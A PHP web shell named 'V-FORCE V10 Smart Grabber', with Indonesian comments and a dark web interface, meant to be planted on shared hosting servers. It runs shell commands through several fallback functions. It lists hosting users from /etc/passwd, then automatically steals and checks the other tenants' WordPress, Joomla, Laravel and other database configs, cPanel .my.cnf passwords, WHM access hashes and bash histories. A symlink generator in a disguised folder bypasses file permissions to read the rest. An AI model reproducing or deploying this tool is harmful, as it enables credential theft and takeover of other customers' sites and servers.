<?php
// ================================================================
// V-FORCE V10 (SMART GRABBER EDITION)
// Fitur: Smart Validation, Custom Naming, cPanel/WHM Grabber
// ================================================================

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
@set_time_limit(0);

// --- KONFIGURASI ---
$save_dir = "vforce_results";
$sym_dir  = "assets_lib"; // Folder samaran symlink
$cache_file = sys_get_temp_dir() . "/vf10_users.json";
$per_page = 50; 

// Init Folders
if(!is_dir($save_dir)) @mkdir($save_dir, 0755);
if(!is_dir($sym_dir)) {
    @mkdir($sym_dir, 0755);
    $ht  = "Options +Indexes +FollowSymLinks\nDirectoryIndex index.html\nAddType text/plain .php .phtml .txt\n";
    @file_put_contents("$sym_dir/.htaccess", $ht);
}

// ================================================================
// 1. SYSTEM FUNCTIONS & EXTREME READ
// ================================================================

function run_cmd($cmd) {
    $cmd .= " 2>&1"; 
    if(function_exists('shell_exec')) { $o = @shell_exec($cmd); if($o) return $o; }
    if(function_exists('exec')) { @exec($cmd, $o); $r = implode("\n", $o); if($r) return $r; }
    if(function_exists('passthru')) { ob_start(); @passthru($cmd); $o = ob_get_clean(); if($o) return $o; }
    if(function_exists('system')) { ob_start(); @system($cmd); $o = ob_get_clean(); if($o) return $o; }
    if(function_exists('popen')) { 
        $h = @popen($cmd, 'r'); 
        if($h) { $o = stream_get_contents($h); pclose($h); if($o) return $o; } 
    }
    return false;
}

function ultimate_read($path) {
    // 1. PHP Native
    $c = @file_get_contents($path); 
    if($c && strlen($c) > 10) return $c;
    
    $path_esc = escapeshellarg($path);
    
    // 2. Standard Binaries
    $bins = [
        "cat $path_esc", 
        "head -n 10000 $path_esc", 
        "tail -n 10000 $path_esc", 
        "more $path_esc", 
        "paste $path_esc", 
        "nl -b a $path_esc",
        "awk '{print}' $path_esc",
        "sed -n 'p' $path_esc",
        "grep . $path_esc",
        "rev $path_esc | rev",
        "dd if=$path_esc",
    ];

    foreach($bins as $cmd) {
        $out = run_cmd($cmd);
        if($out && strlen($out) > 10 && stripos($out, 'Permission denied') === false) return $out;
    }

    // 3. Language Injection
    $perl_cmd = "perl -e 'open(F, \"$path\"); print <F>;'";
    $out = run_cmd($perl_cmd);
    if($out && strlen($out) > 10) return $out;

    $py_cmd = "python -c \"print(open('$path').read())\"";
    $out = run_cmd($py_cmd);
    if(!$out) $out = run_cmd("python3 -c \"print(open('$path').read())\"");
    if($out && strlen($out) > 10) return $out;

    return false;
}

// ================================================================
// 2. SMART VALIDATOR (FILTER KONTEN)
// ================================================================
function is_valid_config($content, $type) {
    if(!$content || strlen($content) < 15) return false;

    // Filter Error Pages / Access Denied
    if(stripos($content, 'Permission denied') !== false) return false;
    if(stripos($content, '403 Forbidden') !== false) return false;
    if(stripos($content, '404 Not Found') !== false) return false;

    // Validasi berdasarkan tipe
    switch($type) {
        case 'wordpress':
            return (stripos($content, 'DB_NAME') !== false || stripos($content, 'DB_USER') !== false);
        case 'joomla':
            return (stripos($content, 'public $user') !== false || stripos($content, 'public $db') !== false);
        case 'laravel':
            return (stripos($content, 'DB_DATABASE') !== false || stripos($content, 'APP_KEY') !== false);
        case 'cpanel': // .my.cnf
            return (stripos($content, 'password') !== false && stripos($content, 'user') !== false);
        case 'whm': // .accesshash
            // Accesshash biasanya string panjang acak tanpa spasi berlebih
            return (strlen(trim($content)) > 30 && stripos($content, ' ') === false);
        default: // General config
            return (stripos($content, 'db') !== false || stripos($content, 'pass') !== false);
    }
}

// ================================================================
// 3. PROXY HANDLER
// ================================================================
if(isset($_GET['view'])) {
    $file = basename($_GET['view']);
    $path = "$sym_dir/$file";
    header("Content-Type: text/plain");
    if(file_exists($path)) {
        $content = ultimate_read($path);
        if(!$content) echo "[ERROR] File ada tapi unreadable.";
        else echo $content;
    } else {
        echo "[ERROR] File symlink tidak ditemukan.";
    }
    exit;
}

// ================================================================
// 4. USER SCANNER
// ================================================================
function get_aggressive_users() {
    $users = [];
    
    // A. /etc/passwd
    $etc = ultimate_read("/etc/passwd");
    if($etc) {
        foreach(explode("\n", $etc) as $l) {
            $p = explode(":", $l);
            if(!empty($p[0])) $users[$p[0]] = $p[5] ?? '/unknown';
        }
    }

    // B. Posix
    if(function_exists('posix_getpwuid')) {
        for($i=0; $i<=2500; $i++) {
            $u = @posix_getpwuid($i);
            if(isset($u['name'])) $users[$u['name']] = $u['dir'];
        }
    }

    // C. Mail & Glob
    $mails = @scandir("/var/mail");
    if($mails) { foreach($mails as $m) { if($m!='.' && $m!='..') $users[$m] = '/home/'.$m; } }
    
    // Filtering
    $valid = [];
    foreach($users as $n => $h) {
        if(stripos($h, '/home') !== false || stripos($h, '/var/www') !== false) $valid[] = $n;
    }
    $final = array_unique($valid);
    sort($final);
    return $final;
}

// ================================================================
// 5. GUI & LOGIC
// ================================================================
$action = $_GET['action'] ?? 'menu';

if($action == 'reset') {
    @unlink($cache_file);
    array_map('unlink', glob("$save_dir/*"));
    array_map('unlink', glob("$sym_dir/*"));
    header("Location: ?action=menu"); exit;
}

if($action == 'scan') {
    $u = get_aggressive_users();
    file_put_contents($cache_file, json_encode($u));
}

$all_users = file_exists($cache_file) ? json_decode(file_get_contents($cache_file), true) : [];
$user_count = count($all_users);
?>

<!DOCTYPE html>
<html>
<head>
    <title>V-FORCE V10 SMART GRABBER</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Consolas', monospace; padding: 20px; font-size: 14px; }
        a { text-decoration: none; }
        .header { background: #161b22; padding: 15px; border-bottom: 2px solid #30363d; border-radius: 6px 6px 0 0; display: flex; justify-content: space-between; align-items: center; }
        .title { font-size: 20px; font-weight: bold; color: #58a6ff; }
        .stats { color: #8b949e; }
        .box { background: #0d1117; border: 1px solid #30363d; border-top: none; padding: 15px; border-radius: 0 0 6px 6px; }
        .btn { display: inline-block; padding: 8px 16px; background: #238636; color: white; border-radius: 6px; border: 1px solid rgba(240,246,252,0.1); margin-right: 5px; font-weight: bold; }
        .btn:hover { background: #2ea043; }
        .btn-gray { background: #21262d; color: #c9d1d9; } .btn-gray:hover { background: #30363d; }
        .btn-red { background: #da3633; } .btn-red:hover { background: #f85149; }
        
        .log-panel { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; height: 400px; overflow-y: scroll; margin-top: 15px; font-size: 12px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { background: #161b22; color: #58a6ff; padding: 10px; text-align: left; border: 1px solid #30363d; }
        td { padding: 8px; border: 1px solid #30363d; color: #c9d1d9; }
        tr:nth-child(even) { background: #161b22; }
        tr:hover { background: #21262d; }
        .pg-btn { padding: 5px 10px; background: #21262d; border: 1px solid #30363d; color: #58a6ff; margin: 2px; display: inline-block; }
        .pg-active { background: #58a6ff; color: #0d1117; }
    </style>
</head>
<body>

<div class="header">
    <div class="title">[ V-FORCE V10 ] SMART GRABBER</div>
    <div class="stats">Users: <b style="color:white"><?php echo $user_count; ?></b></div>
</div>

<div class="box">
    <div style="margin-bottom: 15px;">
        <a href="?action=scan" class="btn <?php echo ($action=='scan')?'':'btn-gray'; ?>">1. SCAN USERS</a>
        <?php if($user_count > 0): ?>
            <a href="?action=grab" class="btn <?php echo ($action=='grab')?'':'btn-gray'; ?>">2. AUTO GRAB (Smart)</a>
            <a href="?action=symlink" class="btn <?php echo ($action=='symlink')?'':'btn-gray'; ?>">3. SYMLINK GEN</a>
            <a href="?action=reset" class="btn btn-red" style="float:right">RESET</a>
        <?php endif; ?>
    </div>

    <?php
    // --- MODE 1: SCAN ---
    if($action == 'scan') {
        echo "<p>Scan selesai. <b>$user_count</b> user ditemukan.</p>";
    }

    // --- MODE 2: AUTO GRAB (SMART & NAMING) ---
    elseif($action == 'grab') {
        echo "<div class='log-panel'>";
        echo "Memulai Smart Grabber...<br>";
        echo "Target: CMS Configs, .my.cnf, .accesshash<br>";
        echo "Filter: Active Check (Validation)<br><hr>";
        
        // DAFTAR TARGET FILE
        // Format: [Relative Path, Type Name, Validation Rule]
        $target_files = [
            // CMS Configs (biasanya di public_html)
            ['public_html/wp-config.php', 'wordpress', 'wordpress'],
            ['public_html/configuration.php', 'joomla', 'joomla'],
            ['public_html/.env', 'laravel', 'laravel'],
            ['public_html/app/etc/env.php', 'magento', 'general'],
            ['public_html/application/config/database.php', 'codeigniter', 'general'],
            ['public_html/config.php', 'opencart', 'general'],
            
            // Server Configs (biasanya di root home)
            ['.my.cnf', 'cpanel', 'cpanel'],
            ['.accesshash', 'whm', 'whm'],
            ['.bash_history', 'bash', 'general']
        ];

        $bases = ['/home', '/home1', '/home2', '/home3/', '/home4/', '/home5/', '/home6/', '/home7/', '/home8/', '/home9/', '/var/www'];
        $found = 0;

        foreach($all_users as $u) {
            foreach($bases as $b) {
                // Loop setiap target yang didefinisikan
                foreach($target_files as $tf) {
                    $rel_path = $tf[0];
                    $type_name = $tf[1];
                    $val_rule = $tf[2];

                    $full_path = "$b/$u/$rel_path";
                    
                    // 1. Baca File
                    $content = ultimate_read($full_path);
                    
                    // 2. Validasi Konten
                    if(is_valid_config($content, $val_rule)) {
                        // 3. Simpan dengan Nama Jelas (user-tipe.txt)
                        $save_filename = "{$u}-{$type_name}.txt";
                        $save_path = "$save_dir/$save_filename";
                        
                        file_put_contents($save_path, $content);
                        
                        echo "<span style='color:#3fb950'>[GRABBED]</span> $save_filename <span style='color:#8b949e'>($full_path)</span><br>";
                        $found++;
                    }
                }
            }
            flush();
        }
        echo "<hr>Selesai. Total valid files grabbed: $found.</div>";
    }

    // --- MODE 3: SYMLINK GENERATOR ---
    elseif($action == 'symlink') {
        $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
        $total_pages = ceil($user_count / $per_page);
        $offset = ($page - 1) * $per_page;
        $paged_users = array_slice($all_users, $offset, $per_page);
        
        echo "<div style='margin-bottom:10px;'>Page: ";
        for($i=1; $i<=$total_pages; $i++) {
            $cls = ($i == $page) ? 'pg-active' : '';
            echo "<a href='?action=symlink&page=$i' class='pg-btn $cls'>$i</a>";
        }
        echo "</div>";

        echo "<table><thead><tr><th>User</th><th>Target</th><th>Method</th><th>Action</th></tr></thead><tbody>";

        // Target prioritas untuk symlink
        $sym_targets = ['public_html/wp-config.php', '.my.cnf', '.accesshash', 'public_html/configuration.php'];
        $bases = ['/home', '/home1', '/home2', '/var/www'];

        foreach($paged_users as $u) {
            $link_created = false;
            foreach($bases as $b) {
                if($link_created) break;
                foreach($sym_targets as $rel_path) {
                    $target = "$b/$u/$rel_path";
                    
                    // Nama file samaran
                    $hash = substr(md5($u.$rel_path), 0, 6);
                    $safe_name = "read_{$u}_{$hash}.txt"; // Menambahkan user di nama file agar mudah dilacak
                    $link_path = "$sym_dir/$safe_name";

                    if(file_exists($link_path)) @unlink($link_path);
                    @symlink($target, $link_path);
                    
                    if(is_link($link_path)) {
                        $url = "?view=$safe_name";
                        $display_target = (strlen($target) > 40) ? "...".substr($target, -35) : $target;
                        echo "<tr>
                            <td>$u</td>
                            <td style='color:#8b949e'>$display_target</td>
                            <td style='color:orange'>Symlink</td>
                            <td><a href='$url' target='_blank' class='btn btn-gray' style='padding:3px 8px; font-size:12px;'>VIEW</a></td>
                        </tr>";
                        $link_created = true;
                        break;
                    }
                }
            }
        }
        echo "</tbody></table>";
        
        echo "<div style='margin-top:10px;'>Page: ";
        for($i=1; $i<=$total_pages; $i++) {
            $cls = ($i == $page) ? 'pg-active' : '';
            echo "<a href='?action=symlink&page=$i' class='pg-btn $cls'>$i</a>";
        }
        echo "</div>";
    }

    else {
        echo "<div style='text-align:center; padding:50px; color:#8b949e;'>
            <h3>Selamat Datang di V-FORCE V10</h3>
            <p>1. <b>SCAN USERS</b>: Cari user hosting.<br>
            2. <b>AUTO GRAB</b>: Ambil config CMS, .my.cnf, .accesshash secara otomatis & validasi.<br>
            3. <b>SYMLINK GEN</b>: Jika grab gagal, gunakan ini untuk bypass manual.</p>
        </div>";
    }
    ?>

</div>
<div style="margin-top:10px; color:#8b949e; font-size:12px;">V-FORCE V10 | Smart Grabber Edition</div>

</body>
</html>
